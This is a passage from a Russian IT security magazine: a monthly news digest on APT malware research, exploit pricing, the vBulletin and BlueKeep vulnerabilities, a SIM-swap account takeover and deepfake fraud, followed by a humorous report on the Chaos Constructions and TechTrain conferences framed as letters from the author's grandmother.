  ло соперничество между спецслужбами, которые работают независимо друг
   от друга и конкурируют за средства. В итоге каж дая группа годами раз‐
  рабатывает и накапливает собственные инстру менты и не делится ими с кол‐
  легами — обычная практика для «пра вительственных хакеров» из Китая
  и Северной Кореи.



         «Хотя каждая груп па действительно пов торно использует свой код
         в раз личных опе рациях и раз личных семействах вре донос ного ПО,
        не сущес тву ет единого инс тру мента, библиоте ки или инфраструк туры,
        которые сов мес тно используются раз ными груп пиров ками, — пишут
         экспер ты. — Избе гая пов торного использования одних и тех же инс-
         тру ментов раз ными организа циями против широкого спек тра целей,
        они минимизиру ют риск того, что одна ском прометированная опе-
        рация потянет за собой и дру гие активные кам пании».

  Аналитики признают, что не изу чали весь код слишком скру пулез но, так
   как речь шла о тысячах образцов. Но, выделив очевидные клас теры вредоно‐
   сов, удалось понять, что некоторые из них (например, ComRAT, Agent.BTZ
  и Uroburos) представляют собой эво люцию семей ства малвари на протяже‐
  нии многих лет.
     Кроме интерактивной карты, специалис ты также представили инструмент,
  работающий с сигнатурами, с помощью которого можно искать часто исполь‐
  зуемые фрагменты кода за авторс твом рос сийских хак‐групп на любом хосте
  или в файле. Этот инструмент призван помочь организациям определить,
  заражены ли они вредоносным ПО, имеющим связь с мал варью русскоязыч‐
  ных APT.


 ЭКСПЛОИТЫ ДЛЯ ANDROID ДОРОЖЕ, ЧЕМ ДЛЯ IOS
   Известный брокер уяз вимостей — компания Zerodium обновила свой прайс‐лист, и теперь экс‐
   плоиты для Android впервые в истории стоят больше, чем экс плоиты для iOS. ИБ‐иссле дова‐
   тели имеют возможность заработать на 0‐day‐багах для Android, эксплуатация которых не пот‐
   ребует взаимодействия с пользовате лем, до 2,5 миллиона долларов США. Аналогичные экс‐
   плоиты для iOS стоят 2 миллиона дол ларов.
      Таким образом, Zerodium подняла вознаграждение за такие эксплоиты для Android почти
   в двенадцать раз по сравнению с прошлым годом (тог да проблемы в опе рационной сис теме
   Google могли принести не более 200 тысяч дол ларов). Для уязвимос тей меньшего калиб ра сто‐
   имость и вовсе возросла более чем в 100 раз.





  →«В последние несколько месяцев мы наблюдали  увеличение количества  эксплоитов
   для iOS, в основном предназначенных для Safari и iMessage, которые создают ся и про даются
   исследователями со всего мира. Рынок 0‐day нас только насыщен эксплоитами для iOS, что
   недавно мы даже стали отказываться от некоторых из них. С другой стороны, благодаря коман‐
   дам безопасности Google и Samsung безопас ность Android улучшается с каждым новым выпус‐
   ком, поэтому разработка полных цепочек эксплоитов для Android стала сложной и тру доемкой
   задачей, превосходящей по сложности даже создание zero‐click‐эксплоитов, не тре бующих
   взаимодействия с пользователем»
  — глава Zerodium Чауки Бекрар





 0‐DAY В VBULLETIN
  Некий анонимный исследова тель обна родо вал в открытом доступе детали
  опасной уязвимости нулево го дня в форумном движке vBulletin, а также экс‐
  плоит для нее. Баг позволяет зло умышленнику выпол нять shell‐команды
  на уязвимом сервере. Причем ата кующему достаточно использовать простой
  HTTP POST запрос и не нуж но иметь учетную запись на целевом форуме, то
   есть проблема относится к неп рият ному клас су pre‐authentication‐уязвимос‐
   тей.
    На GitHub уже опубликова но детальное опи сание проблемы, а также
   в Сети оперативно появился скрипт для поис ка уязвимых серверов. Спустя
  всего день после обнародования информа ции о баге пользователи vBulletin
  начали сооб щать об ата ках на свои форумы. Некоторые даже жаловались
  на полное удаление БД при помощи данной проблемы.
    Интересно, что после публикации данных об уяз вимости глава компании
   Zerodium Чауки Бекрар заявил в Twitter, что его компании и клиентам было
  известно об этой проб леме на протяжении трех лет, а эксплоиты для нее дав‐
  но продают на черном рынке.


                                        Продолжение статьи →
← Начало статьи





   Так как разработчики vBulletin хра нили молчание, ИБ‐эксперт Ник Кано (Nick
  Cano) создал простую неофициальную «заплатку». Для ее применения дос‐
   таточно было  отредактировать  includes/vb5/frontend/controller/bbcode.php
  соответствующим образом. Однако спустя нес колько дней разработчики
   vBulletin все же прервали свое затянувшееся молчание и сообщили о выходе
  официального патча для vBulletin версий 5.5.X. Также выяс нилось, что уяз‐
  вимости был присвоен идентифика тор CVE‐2019‐16759.


  1 ДОЛЛАР ЗА 0,1 BTC


   Исследователи компании Armor заметили, что похищенные с чужих банков ских сче тов средства
   продаются в даркнете всего за 10–12% их реальной стоимос ти в BTC‐экви валенте. В такой схе‐
   ме хакер занят лишь взломом, а отмывание денег уже ложится на самого покупателя.


   Так, хакеры предлагают переправить имеющиеся в их распоряжении средства на банковский
   счет, аккаунт PayPal или через Western Union. В одном из случаев покупатель приобрел
   10 000 долларов за 800 долларов, говорится в отчете.

   Также, согласно докладу аналитиков, на черном рынке по‐прежнему активно про дают учетные
   данные от чужих банковских счетов (в том чис ле Wells Fargo, Bank of America, Lloyd’s Bank
   и платежной системы PayPal), а Bitcoin остается наибо лее популярной криптовалютой дар‐
   кнет‐экономики.





 ВЗЛОМАН TWITTER
 ГЛАВЫ TWITTER
  В конце августа 2019 года Twitter‐аккаунт Джека Дорси (Jack Dorsey), CEO
   Twitter, подвергся взло му. Скомпро метировав учетную запись, злоумыш‐
  ленники принялись публиковать от лица Дорси оскорбительный и расистский
  контент и даже утвержда ли, будто в штаб‐квартире компании заложена бом‐
   ба. Ответственность за эту атаку взяла на себя хак‐группа Chuckle Gang.
     Согласно официальным данным, атака произошла по недос мотру мобиль‐
  ного оператора, который допустил компро метацию и позволил неавторизо‐
  ванному лицу отправлять SMS с телефонного номера Дорси. Дело в том, что
  до недавнего времени Twitter можно было исполь зовать пос редством SMS‐
  сообщений, и это было довольно популярно еще на заре появления сервиса.
  Главное условие — чтобы эту функциональность поддерживал оператор свя‐
   зи. Когда‐то ограничение в 140 символов появилось именно из‐за этого:
   из‐за максимальной длины SMS‐сообщений.
    Об этой «слабости»  Twitter было извес тно давно.  Так, еще в кон‐
  це 2018 года эксперты компании Insinia Security предупреждали об опасности
  применения SMS‐сооб щений в качестве второго фактора для аутентифика‐
  ции и объясняли, чем чревато использование функци ональности Twitter через
  SMS. Хуже того, в Сети можно найти статьи об опас ности этой функциональ‐
  ности, датированные 2007 и 2009 годами.
    Проблема в том, что в последние годы злоумыш ленни ки все чаще «уго‐
  няют» SIM‐карты пользователей, реализуя так называемый SIM swap. Суть
   таких атак заключается в том, что прес тупник обращается к представителям
  сотового оператора своей жертвы и применя ет социальную инже нерию.
  К примеру, выдавая себя за нас тоящего владель ца номера, злоумышленник
   заявляет, что потерял или сло мал SIM‐карту, и добивается переноса номера
  на новую SIM‐карту. Затем злоумыш ленники вору ют привязанные к номеру
  телефона учетные записи, фактичес ки похищая чужие личности полностью.
  Такие атаки часто используются для кра жи крупных сумм в криптовалюте
  или компрометации дорогих Instagram‐аккаунтов.
     Теперь разработчики Twitter сообщили, что пос ле взлома Дорси они при‐
  няли решение отключить функциональность отправки твитов через SMS‐
  сообщения. Подчеркивает ся, что отключение носит временный характер,
  однако сроки возоб новления работы этой функции пока не называются.
  Интересно, что при этом разработчики в некото рой степени перекладывают
  вину на мобильных операторов, отмечая, что тем нужно исправить уязвимос‐
   ти на своей стороне.


  УГРОЗЫ ДЛЯ MACOS
  Миф о том, что угроз для операционной сис темы macOS не сущес твует, в очередной раз
   решили опровергнуть исследователи «Лаборатории Кас перско го». Они отмечают, что ландшафт
   угроз для устройств Apple меняется, а количество вредонос ного и нежелательного ПО увеличи‐
   вается.

  В первой половине 2019 года было обнаружено почти 6 000 000 фишинговых атак на поль‐
   зователей macOS. Из них 11,80% были нацелены на корпоративных пользователей.





   Странами с наибольшей долей атакованных фишерами уникальных пользователей macOS стали
   Бразилия (30,87%), Индия (22,08%) и Франция (22,02%).

   Количество атак на пользователей с привлечением вредонос ных и потенциально нежелатель‐
   ных программ возраста ло ежегодно начиная с 2012 года и в 2018 году перешагнуло отметку
   в 4 000 000 атак. В первой половине 2019 года чис ло атак сос тавило 1 800 000.

   Подавляющее большинство угроз для macOS в 2019 году отно силось к категории AdWare.
   Среди вредоносного програм много обеспечения самой популярной угрозой стало семейство
   Shlayer, маскирующееся под Adobe Flash Player или его обновления.





                          Топ‐10 угроз для macOS за первую полови ну 2019 года

   Больше 25% пользователей, столкнувшихся с атаками вредоносного и нежелательного ПО,
   живут в США.





        Количество вредоносных и потенциально нежела тельных файлов для macOS, 2004–2019 годы





 ГОЛОСОВОЙ
 DEEPFAKE
  The Wall Street Journal рассказал об интересном слу чае: мошенники исполь‐
  зовали голосовой deepfake, что бы во время телефонного разговора выдать
  себя за руководителя неназванной немецкой фирмы. По телефону фиктивный
  CEO, чей голос был подделан при помощи ИИ, попросил главу неназванной
  дочерней фирмы из Британии срочно перевес ти 220 тысяч евро на счет неко‐
  его венгерского поставщика, хотя на самом деле этот счет при надлежал
  преступникам.
    Об этом случае стало извес тно бла годаря стра ховой компании Euler Her‐
  mes Group, которая занималась рас следова нием инцидента. По мнению спе‐
  циалистов страховой компании, для создания подделки мошенники восполь‐
  зовались коммерческим, дос тупным на рын ке ПО. Глава британской фирмы
  заподозрил подвох, когда «руководитель из Германии» позвонил уже в третий
  раз и попросил о втором денежном переводе, но звонок при этом исходил
  с австрийского номера. К сожалению, к это му моменту первый перевод уже
  был отправлен и поступил на счет в Венгрии, отку да средс тва были выведены
   в Мексику.
    Интересно, что это не первый случай использования голосовых deepfake
  таким образом. В июле текущего года BBC сооб щала, что эксперты компании
  Symantec обнаружили три ана логичных случая, когда ИИ‐технологии при‐
  менялись для подделки голосов генеральных директоров. Из‐за этих фейков
  неназванные компании‐жертвы потеряли миллионы долларов.
    Еще тогда специалисты предупрежда ли, что руководители компаний могут
   стать легкой мишенью для мошенничес тва и создания голосовых deepfake.
  Дело в том, что образцы их голосов можно без тру да найти в выступлениях
   в СМИ и на конференциях, видео на YouTube и так далее.


  ВСЕГО 9% ПОЛЬЗОВАТЕЛЕЙ ВЫБИРАЮТ ЛЕГАЛЬНЫЙ
 КОНТЕНТ
   Согласно исследова нию, проведенному компанией ESET в сен тябре 2019 года, большинство
   пользователей предпочитают пиратский контент лицен зионному. Респондентам предложили
   ответить на два воп роса, в которых можно было выбрать несколько вариантов отве та. Так,
   отвечая на вопрос «Какой кон тент вы „пиратите“ чаще все го?», мно гие пользователи указали
   более одного вида контента.

  52% опрошенных скачивают «взломан ные» игры, 43% смотрят нелицензион ные фильмы
   и сериалы, 34% чаще слушают музыку с помощью нелегальных сервисов.

   При этом всего 14% скачивают книги на «пиратских» сайтах, а 19% обычно устанавливают
   «взломанные» программы. И все го 9% интернет‐пользователей всегда платят за лицен зию.

   Второй вопрос касался причин, которые мешают людям пользоваться легальным контентом.
   Участников опроса отпугивает высокая цена (75%), непол ный ассортимент легальных сервисов
     (34%) и неудобная система оплаты (16%). Еще четверть интернет‐пользователей отказыва‐
   ются платить за лицензию по идейным соображениям.





 ЭКСПЛОИТ ДЛЯ
 BLUEKEEP
  Разработчики Metasploit опубликовали эксплоит для уязвимости BlueKeep. Он
  позволяет добиться выполнения кода и прост в использовании.
     Критическая уязвимость CVE‐2019‐0708 (она же BlueKeep), связанная
  с работой Remote Desktop Services (RDS) и RDP, была исправлена Microsoft
  еще в мае текущего года. С помощью этого бага атакующие могут выполнять
  произвольный код без авториза ции и рас пространять свою мал варь подобно
  червю, как, например, было с извес тны ми вредоносами WannaCry и NotPetya.
  Проблема опасна для Windows Server 2008, Windows 7, Windows 2003 и Win‐
  dows XP, для которых из‐за высокой серь езности проблемы были выпущены
  обновления безопасности.
     Эксперты  Microsoft предупреждали об опасности BlueKeep дважды,
  а вместе с ними на проб лему обра щали внимание АНБ, Минис терство внут‐
  ренней безопасности США, Авс тралийский центр кибербезопас ности, Наци‐
  ональный центр кибербезопасности Великоб ритании и многие дру гие. Спе‐
  циалисты сразу нескольких ИБ‐компаний (вклю чая Zerodium, McAfee, Check
   Point и «Лабораторию Касперского»), а также независимые исследователи
  разработали собственные proof of concept экс плоиты для уяз вимости. Код
   этих экспло итов не был опубликован в откры том доступе из‐за слишком
  высокого риска.
     Кроме того, для уязвимос ти еще летом был соз дан модуль Metasploit (тоже
  не был представ лен в открытом дос тупе по тем же причинам), а также ком‐
  мерческий RCE‐эксплоит, написанный компанией Immunity Inc, но недос‐
  тупный широкой публике.
     Теперь специалисты компании Rapid7, разрабатывающей Metasploit, опуб‐
  ликовали экспло ит для BlueKeep в формате модуля Metasploit, доступного
  всем желающим. В отличие от других PoC‐экспло итов, давно выложенных
   в Сети, это решение действитель но позволяет выполнить произвольный код
  и представляет собой «боевой» инстру мент.
     Впрочем, разработчики все же оста вили в коде своеобразный пре дох‐
   ранитель: в настоящее время экспло ит работа ет только в режиме ручного
  управления, то есть ему все же требуется вза имо действие с человеком. Опе‐
  ратору Metasploit придется вручную ука зать всю информацию о целевой сис‐
   теме,  и  автоматизировать  атаки  и  исполь зовать  BlueKeep  массово,
   как самораспространяющегося червя, не выйдет. Однако возможности тар‐
  гетированных атак это, конечно, не отменяет. Также нужно заметить, что
  модуль BlueKeep Metasploit работа ет только с 64‐раз рядными версиями Win‐
  dows 7 и Windows 2008 R2, но бесполезен про тив дру гих уязвимых версий
  ОС.
     Хотя у компаний и пользователей было достаточно вре мени на установку
   патчей, по данным компании BinaryEdge, в Сети по‐прежнему можно обна‐
  ружить около 700 тысяч уяз вимых перед проб лемой BlueKeep систем. Так что
   в скором времени мы определенно не раз услышим об эксплуатации уяз‐
  вимости злоумышленниками.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Серверы Supermicro уязвимы перед набором багов USBAnywhere и удаленными атаками


  В результате взлома форума XKCD пос традали 562 тысячи человек


   Автор ботнета Satori признал себя виновным. Ему грозит до десяти лет тюрьмы


   Более 600 тысяч GPS‐трекеров используют пароли по умолчанию и доступны всем желающим


   Поддержку DNS‐over‐HTTPS в Firefox включат по умол чанию для американских пользовате лей


   Роскомнадзор проверит инструменты для блокировки Telegram в Тюмени


   Пиратское приложение CotoMovies закрылось и передало дан ные пользовате лей правооб‐
   ладателям


   Личные данные почти всего населения Эквадора попали в открытый доступ


   GitHub теперь может присваивать уязвимостям иден тификаторы CVE


   Mac перестали загружаться из‐за обновления Google Chrome
HEADER





БАБУШКА И «ХАОС»

   КАК МОЯ БАБУЛЯ СЪЕЗДИЛА В ПИТЕР
 НА CHAOS CONSTRUCTIONS И TECHTRAIN



IT‐конференции — это работа или отдых?
Есть ли смысл туда ехать? Почему лучше
увидеть все самому, а не смот реть записи
выступлений? Моя бабуля даст небаналь‐
ные ответы на эти и другие небанальные       Михаил Емельченков                                                                                  Исследования и разработки
вопросы. Ведь она побыва ла сразу на двух
питерских айтишных фестивалях ухо дящего
лета — Chaos Constructions и TechTrain.



      «Дорогой  мой   внук!  Пишу  тебе  из  слав ного  города‑героя
      Санкт‑Петер бурга. Доеха ла быс тро. Твои гос тинцы вир туоз но про-
     тащила мимо контроля, они даже ничего и не поняли во всех этих
      элек тронных штуч ках. Как ты и просил, схожу на конференцию —
      посижу  в  сторонке,  пос лушаю,  о  чем  люди  толкуют,  да  тебе
      перескажу. Целую, твоя бабуш ка».

Вот такую мессагу кинула мне бабуля в «Телеграм». Я сначала не верил, что
между сидением дома и варкой борщей она «тряхнет стариной» и отправится
в самостоятельное путешествие. Ее пос ледняя поездка закончилась не очень
хорошо — семь лет тюрьмы в Соединенных Шта тах за промышленный шпи‐
онаж. Ох и кричали тогда заголовки местной прес сы!



      «Советский агент протащил через таможню „жучок“ на базе ЕС ЭВМ».
      «В чемода не не платья и шле панцы, а мик росхе мы и шиф ровки!»
      «Зачем молодой девуш ке столько пер фокарт?»
     «FORTRAN — любов ный роман длиною в 7 лет».

Не скажу, что газетчики писали одну только правду. Но факт остается фак‐
том — бабуля уехала в Питер и присылает мне ежедневные отчеты. А я решил
поделиться ими с тобой — не все ж за компь ютером сидеть, надо и «людей
посмотреть, себя показать».
  Спонтанность — главная особенность моей бабушки. Как она с ходу при‐
села на 7 лет, лишь пересекши океан, одно му Биллу Гей тсу известно. А может
быть, правду пишут о том, что ЕС ЭВМ немного не влезала в дамский багаж.
На чем бабуля и «спалилась». Как бы то ни было, начну с самого важного.





  Пока не начались конференции, бабуля радова ла меня открытками
  из Питера





            Знаменитые Пять углов (на фото вошли не все)



                                     Продолжение статьи →
HEADER               ← НАЧАЛО СТАТЬИ
   БАБУШКА И «ХАОС»
                 КАК МОЯ БАБУЛЯ СЪЕЗДИЛА В ПИТЕР
             НА CHAOS CONSTRUCTIONS И TECHTRAIN





МНОГО ФАНА

      Ох, вну чок, ну и уста ла я сегод ня. Вкратце рас ска жу, что было. Только
      собира лась поехать на TechTrain, как встре тила свою однополчанку,
      а  та  говорит —  внуч ка  на  Chaos  Constructions  пригласила.
      Докладывает: еды там нет, принеси че‑нить вкус ного. Вот я и несу ей
     пирожков поесть да хакеров мес тных под кормить, авось что и выбол-
      тают полез ного. Ну я с ней тоже пош ла.
       Приш ла на круглый стол по Embedded. В наше вре мя что такое
     было embedded? Если радиолам па в кар ман помеща лась, зна чит, уже
      embedded! А теперь все эстэ эмка ми обза велись да прочими контрол-
      лерами и ПЛИ Сами — и чего только не ваяют. Двигате ли для мор ских
      кораблей — и  те на мик рологике  теперь работа ют. Ребята все
      молодые, статные, аж влю билась в одного. Говорят кра сиво, о судь-
      бах Рос сии, с болью в душе. Мол, не очень‑то у нас эта сфе ра
      хорошая, неграмотно много вещей дела ют. Ну и раз говорились, а вот
       «у  них»,  где‑то  за  рубежом,  луч ше  или  хуже?  Думали‑думали,
      обсужда ли‑обсужда ли — да приш ли к выводу, что вез де не очень.
       И заинтересовало меня, а как же так, ведь мир в целом неп лохо
      живет. Почему же «не очень все»? И приш ла я к выводу, что наши
      компьютер щики  к работе очень ответс твенно под ходят, ста раются
      сде лать не как быс трее, а как луч ше, гра мотнее. Но не всегда у них
      это получа ется. Ругаются почем зря: мол, хотим как луч ше сде лать,
      а начальник «добро» не дает, или сроки под жима ют, или людей
      не хва тает, или еще что похуже. Вот и выходит, что из‑за высоких
      внутренних уста новок им кажется, что вок руг все плохо. Но это не так.
     Хорошо у нас, вну чок. Вот и внуч ка однополчанки тоже говорит: учи-
      лась в Полите хе на приборос троении, так и ассем блер был, и C++,
      и радиоэлек троники в дос таточ ном количес тве.

Радостно слышать такое от бабули. В мое время преподавателей было
не оторвать от бутылки, а экза мены приходи лось сдавать сбором средств
на приобретение новых бутылок — ну или машин и квартир. И интернета
не было, и «Алиэкспрес са» с дешевыми эстэ эмками не было, и всяких Ar‐
duino, Raspberry Pi и Altera Cyclone тоже. Да и денег не было, чтобы купить
это, даже если бы оно продава лось. Жить стало лучше, жить стало веселее!
  Но и сложности, конечно, есть. Главным образом с производством и сбы‐
том. Попробуй‐ка ввезти в Рос сию партию комплектующих без нотификации
ФСБ. Чтобы все офор мить, целый юридичес кий отдел понадобится. А как
продавать готовые устройства за рубеж? Тоже не всегда возможно. И совсем
уж нонсенс услышать хочешь? Не все произведенные в России устройства
можно ввезти обратно по гарантии — их попросту не пропус тит таможня.
Каково, а?
  Производителям дешевле отпра вить новое, чем растамаживать ремон‐
топригодное, вот так. Приходится открывать сервис‐центры в более лояльных
странах. Конечно, при таких картах глобальную партию не выиграть. Вот
и устремляют взоры наши спецы за рубеж. А с этим как раз не все так сложно,
как может показаться: иностранцам не очень принципиально, у кого заказы‐
вать.
  Ментальность тоже игра ет роль. Взять азиатов — они предпочитают
работать со «своими». Их жизненный уклад, куль тура, мировоз зре ние сильно
отличаются от наших. А европейцам, наоборот, все равно, с кем работать,
лишь бы было качественно. Одна ко они предъявля ют высокие требования
ко всяким сертификатам продукции и производс тва. Но больше зависит
от самого заказчика — все решает «личная химия». Почти как в отношениях.
Понравятся топ‐менеджеры друг дру гу — зна чит, подпишут контракт. И не
важно, что с разных континентов люди. Главное — вера в успех общего дела.


      Кру чу‑вер чу в  руках програм мку конференции, и вдруг на  гла за
      попада ется тема «Мониторинг в ЦОД». Пош ла пос мотреть, да открыть
      дверь не смогла, изнутри зак рыта! Так и не попала в зал. А в сосед-
     нем помеще нии  проходила  наглядная  лек ция  по  отмычкам.  Ох
      и жалею я, что нет у меня их навыков, ина че разобралась бы с зам ком
      в два сче та. А вообще, все пра вильно сде лали: ЦОД — такое мес то,
      куда не каждому заходить поз волено. А зна чит, нечего под слу шивать,
      что они там мониторят.

Похоже, у моей бабушки не хва тило прав дос тупа!





  В одной из комнат была раз вернута нас тоящая видеосту дия с винтажным
  оборудованием



     Пош ла  дальше.  Наткну лась  на  инте рес ных  ребят.  Занима ются
      «хардварной безопас ностью». Пишу слова ведуще го: «Пла тят много,
      кида ют  еще  больше».  Там  у  них  все,  как  ты  выража ешься,
      «по хардкору»: под польные китайцы сливают проп риетар ные кабели
      для отладки устройств. Обме нива ют на что‑то немате риальное неиз-
      вес тно отку да взяв шиеся сор цы внутренних тулз, без которых раз-
      нообразный взлом был бы в принципе невоз можен.
        А что может быть немате риального у хакеров? Дос тупы к сек-
      ретным FTP, все воз можные непубличные инс тру менты, собс твенные
      изыс кания о критичес ких уяз вимос тях в том или ином железе. Биз-
      несме ны пред лагают деньги за взломы, за выс тупле ния на конферен-
       циях, а хакерам это неинтерес но, ведь деньги — не глав ное. И при
      этом все рав но при деньгах! Поп робуй‑ка тут не романтизировать эту
      субкультуру: нас тоящие пираты — как из романов моей юнос ти!

Еще бы! Не каждый может себе поз волить сказать «не хочу» на какое‐либо
выгодное предложение. Что для бизнесмена — упущенная возможность, то
для хакера — сво бода воли.



      Зна ешь, вну чок, я тебе никогда не рас ска зыва ла, что в Аме рике я поз-
      накомилась с одним хакером, который увле кался компьютер ными
      игра ми. Водил он меня в зал игровых автоматов, а дома у него был
        Atari 2600. Но вот такой аппа рат мне видеть не доводилось.

Следом за этим сооб щением бабушка скинула фотографию Vectrex. Мало кто
в наших краях слышал об этом устройстве. Это векторная игровая консоль
со встроенным монитором. Векторной она называ ется потому, что принцип
работы ее дисплея совпада ет с прин ципом работы дисплея осциллографа:
изображения строятся не попиксельно, а линиями.
   Эта американ ская консоль приобрела ста тус культовой, и в наше время
вокруг нее сложилось большое сообщество. Появи лись аппаратные фиксы
заводских недостатков, мультикартриджи с игра ми и даже новые инди‐игры.
Оказывается, недавно один из таких аппа ратов при обрел музей «Яндекса».
Его сотрудники привезли часть своей коллекции ретромашин на фестиваль,
где бабуля и увидела незнакомый ей девайс.





  Старым компьютерам и ностальгичес ким играм, как всегда, нашлось
  место на Chaos Constructions





  Здесь посвящали в адепты механичес ких клавиатур. У бабушки и так
  механическая, но за молодежь она была рада





  Демки для ZX Spectrum — еще одна традиция CC. Бабуля подивилась
  тому, что сейчас делают на ZX Evolution

А еще бабушка рассказала про Software Deﬁned Radio (SDR). Можно, говорит,
спуфить GPS‐координаты и играть в Pokémon Go «на максималках»! В ее‐то
возрасте по городу не набегаешься, а с SDR даже из дома выходить не надо,
все покемоны сами при ходить будут — тут‐то их и поймают.
  А от себя скажу, что более полезное применение SDR — это программные
реализации базовых станций GSM и  LTE. Можно собрать собс твенную
сотовую сеть. Толь ко не делай это го дома! А то придет товарищ майор
и  задаст вопрос о  легальнос ти использования  частотного диапазона.
И «Хакером» тебе от него не отмахать ся.
   Казалось бы, это все игрушки. Поделюсь инсайдом: глобальный рынок
сотовых станций монопо лизировал Huawei, а в технологии SDR находит воп‐
лощение идея борьбы опенсорса с проприетарщиками. Открытые технологии
позволят небольшим независимым компаниям войти на рынок телеком‐
муникаций и оздо ровить его. Мы с тобой как конечные пользователи от этого
только выиграем.
  Я бы мог долго рассказывать о SDR, но в «Телеграме» новое сообщение.


                                     Продолжение статьи →
HEADER               ← НАЧАЛО СТАТЬИ
   БАБУШКА И «ХАОС»
                 КАК МОЯ БАБУЛЯ СЪЕЗДИЛА В ПИТЕР
             НА CHAOS CONSTRUCTIONS И TECHTRAIN





МНОГО РАБОТЫ

       TechTrain встре тил меня холод ными объятиями здоровенного выс-
      тавоч ного центра где‑то за кольцевой автомобильной дорогой. Вот
      думаю, а пра вильно ли я сде лала, что не пош ла на выс тавку дач ных
      рас тений, проходив шую непода леку? Там были конь и даже вер блюд!
     А у программис тов их не было. Но все‑таки хоть я и ста рая, а из ума
     еще не выжила. Поэтому быс тро прош ла регис тра цию и впе ред!
        Один из пер вых док ладов, на которые я попала, назывался «Само-
      оценка и самоценность. Как перес тать гоняться за „успе хом“ и начать
       жить». В наше вре мя о таких вещах не говорили, пар тия решала все
      за нас: куда идти по жиз ни, как ста новиться успешны ми, чем гор дить-
       ся. И, зна ешь, как‑то счас тливее жили, понятнее. А сейчас ты мне
     сам рас ска зыва ешь про своих дру зей, которые на энту зиаз ме находят
      новую работу, а уже через год впа дают в деп рессию от «выгора ния»
      и начина ют сом неваться в пра вильнос ти выбора профес сии.
       Я все не понима ла, почему так у вас происходит. И вот Ирина Мат-
      веева, док ладчик, мне гла за на это откры ла. Все дело в самооценке
      и осоз нании своей ценности вне зависимос ти от суждений дру гих
      людей. Для многих работодате лей ты прос то «челове чес кий ресурс»,
      а не «высокок лас сный спе циалист», «ценный сотрудник» и прос то
      «хороший человек». Отсутс тву ет обратная связь, нес пра вед ливо оце-
      нива ют дос тижения, не уде ляют внимание пер сональным особен-
      ностям лич ности. Из‑за этого пропада ет любовь к себе, пропада ет
      желание работать. Гра мотно рас ска зыва ла, мотивирующе. Вот чего
      не хва тает сов ременной молоде жи!

Да, бабуля права… Я и сам часто об этом думаю. В погоне за технологиями
забываем главное — ради кого эти технологии создаются. Ради человека.
Ради тебя и меня. Для лучшей и счас тливой жиз ни, а не для депрессий
и выгораний.
  Перед отъездом я поп росил бабуш ку застать хотя бы одного из «звез‐
дных» гостей, а имен но Джо на Ромеро или Ричарда Столлмана.


      Вну чок, слу шаешь ли ты дип‑хаус? Акку рат перед выходом Столлма на
      заиграл ремикс You Sexy Motherfucker, что, несом ненно, добавило
      пер чинку в происходящее событие. Аме риканский дедок в зеленом
      поло под нялся на сце ну и пошел заваривать чай. Я обыч но макаю
      и оставляю пакетик, а он его долго‑долго кру тит по кру гу — надо бы
      поп робовать так же!
       Ве щал он долго, я даже потеряла счет вре мени. Люди впа ли в гип-
      нотичес кий сон. Я заметила двух девушек, дре мав ших на пле чах
       у своих молодых людей. Но человек‑легенда есть человек‑легенда.
     Огромный зал был забит битком. Когда ему захоте лось поча евничать
      снова, он поп росил об этом со сце ны, и молодой адепт под бежал
      заварить ему еще кру жеч ку. Не у всякой религии такие пре данные
      пос ледова тели.

Бабушка долго и восторженно говорила о самобытном дедуле, но в основном
это были общеизвестные вещи. Был рас сказ о базовых принципах Free Soft‐
ware Foundation; о том, что несвободное ПО не должно существовать, потому
что угрожает свободе человечества; что проп риетарщики контролиру ют наши
устройства и могут удалять с них программы и контент; что вез де слежка
и лучше не пользоваться мобильными телефонами. Ну и, конечно, что Ричард
выступает не за открытые исходники, а именно за «фри софтвер», свободный
софт, и это его прин ципиальная позиция. И многое‐многое другое.





               Не смотри на ноги. Я предупреждал!

Но вот на этих стро ках я прямо протер глаза:



      …ах, такой милаш ка, такой затейник! Долго рас ска зывал о сле дящих
      секс‑игрушках. Что внутри каждой игрушки стоит датчик тем перату ры,
      и вся телеметрия и команды управле ния переда ются через сер вер
      ком пании‑вла дельца, которая собира ет базу данных о том, кто с кем
      и каким обра зом спит!

Я понимаю бабулю. Она всегда интересовалась импозантны ми мужчинами,
и Ричард разжег в ее душе пожар. Его перевоплощение в святого Игнусиуса
из церкви Емак са с нимбом из жесткого дис ка от старого мейнфрейма
заставило ее сердце бить ся чаще, чем при привычной тахикардии.



     А еще тут сос тоялся аук цион, на котором Столлман продал плю шевую
      игрушку антилопы гну за 33 тысячи рос сийских рублей. А свою кни-
       гу — за 12 тысяч. Игрушку он, кста ти, поцеловал и потер о бороду, так
      что она теперь освященная.

Не буду рассуждать о личности это го человека, его идеалах и жиз ненных
принципах — ты все и так зна ешь и наверняка имеешь собственное мнение.
Для бабушки это было шоу суперзвез ды, а такие шоу всегда вызывают вос‐
торг.





Из знаковых фигур на конференции выс тупал Олег Бартунов. Если не пом‐
нишь по фамилии — то сейчас наверняка вспомнишь, я тебе подскажу. Дол‐
говязый длинноволосый мужчина монгольской внеш ности. Вспомнил? Имен‐
но он «принес» PostgreSQL в Рос сию и привнес в код этой СУБД много важ‐
ного и нового, что позволило ей занять первое мес то в российском хайлоаде.





Не буду копировать тебе все, что написала бабуля, но один комментарий
показал ся мне интересным.



     Са мая большая проблема челове чес тва в будущем будет в том, чтоб
      не прев ращаться  в  баранов. PHP-шников заменит  искусс твенный
      интеллект. А сфе ра IT — это вре менное занятие челове чес тва.

Как тебе такой прогноз? Можешь не боять ся: я тоже, бывает, пишу на PHP,
и если меня в этом заменит ИИ, то я буду только рад — потому что к тому вре‐
мени появится какой‐нибудь Fresh PHP, Web 100500 VR и еще пачка мод ных
баззвордов, которые будут отнимать все свободное время и ресурсы ПК.
Идеальный мир, в котором пра вит логика и здравый смысл — это не про наше
измерение. Не забывай, что существу ет «теория матрицы», где все мы есть
продукт компьютерной симуляции. Так что, перефразируя слова Олега, мож‐
но сказать, что «человечество — временное занятие ИИ».



      Вну чок, ты же зна ешь, я в базах данных не сильна, PostgreSQL
      от MySQL не отличу. Поэтому давай я тебе о чем‑нибудь понятном
      рас ска жу. Вот, пом нишь, я яблоками на рынке пыталась тор говать?
     Выс троила, так ска зать, мар кетинговую стра тегию. Сосед кам по рынку
      в их яблоки сла бительное вка лыва ла, и покупа тели потом бра ли толь-
      ко у меня. Ну, тогда девянос тые были, каюсь, выжива ла как могла.
     А теперь на носу двад цатые, надо идти в ногу со вре менем.
       Поэтому потопа ла я на лек цию мэтра рос сийского интерне та Дмит-
      рия Завалишина. Рас ска зывал он про циф ровую трансфор мацию ком-
